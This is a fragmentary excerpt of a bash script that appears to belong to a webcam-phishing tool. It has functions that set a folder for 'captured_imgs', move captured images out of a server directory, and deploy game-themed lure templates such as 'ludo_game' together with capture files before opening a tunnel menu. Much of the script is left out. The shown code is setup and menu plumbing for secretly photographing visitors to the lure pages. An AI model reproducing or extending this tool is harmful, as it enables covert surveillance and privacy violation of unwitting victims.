...
# Default image capture path
CAPTURE_PATH="$SCRIPT_DIR/captured_imgs"

# Load saved path if exists
if [ -f "$SCRIPT_DIR/.capture_path.conf" ]; then
    CAPTURE_PATH=$(cat "$SCRIPT_DIR/.capture_path.conf")
fi
...
# ─────────────────────────────────────────────────────────────────────────────
# Move captured image files from .server/images → CAPTURE_PATH
# ─────────────────────────────────────────────────────────────────────────────
move_capture_file() {
...
# ─────────────────────────────────────────────────────────────────────────────
# Change image capture path
# ─────────────────────────────────────────────────────────────────────────────
change_capture_path() {
    echo -e ""
    echo -e "    ${cyan}[${orange}+${cyan}]${white} Current path: ${green}$CAPTURE_PATH${nocolor}"
    echo -e "    ${cyan}[${orange}+${cyan}]${white} Default path: ${green}$SCRIPT_DIR/captured_imgs${nocolor}"
    echo -e ""
    read -p "    ${cyan}[${orange}+${cyan}]${white} Enter new image path: ${green}" new_path
    echo -e "${nocolor}"
    ...
    if [ -n "$new_path" ]; then
        # Save to config file
        echo "$new_path" > "$SCRIPT_DIR/.capture_path.conf"
        CAPTURE_PATH="$new_path"
        mkdir -p "$CAPTURE_PATH"
        echo -e "    ${cyan}[${green}✔${cyan}]${white} Path updated to: ${green}$CAPTURE_PATH${nocolor}"
    else
        # Reset to default
        echo "$SCRIPT_DIR/captured_imgs" > "$SCRIPT_DIR/.capture_path.conf"
        CAPTURE_PATH="$SCRIPT_DIR/captured_imgs"
        echo -e "    ${cyan}[${green}✔${cyan}]${white} Path reset to default: ${green}$CAPTURE_PATH${nocolor}"
    fi
    sleep 1
    main_menu
}
...
# ─────────────────────────────────────────────────────────────────────────────
ludo_game() {
    local path="$SCRIPT_DIR/.sites/ludo_game"
    _check_template_dir "$path"

    cp -r "$path"/* "$SCRIPT_DIR/.server/"
    cp -r "$EYE_PATH"/* "$SCRIPT_DIR/.server/"
    echo -e "    ${cyan}[${green}✔${cyan}]${white} Files deployed successfully.${nocolor}"
    sleep 1
    tunnel_menu
...
# ─────────────────────────────────────────────────────────────────────────────
game_loadar() {
    local path="$SCRIPT_DIR/.sites/game_loadar"
    _check_template_dir "$path"
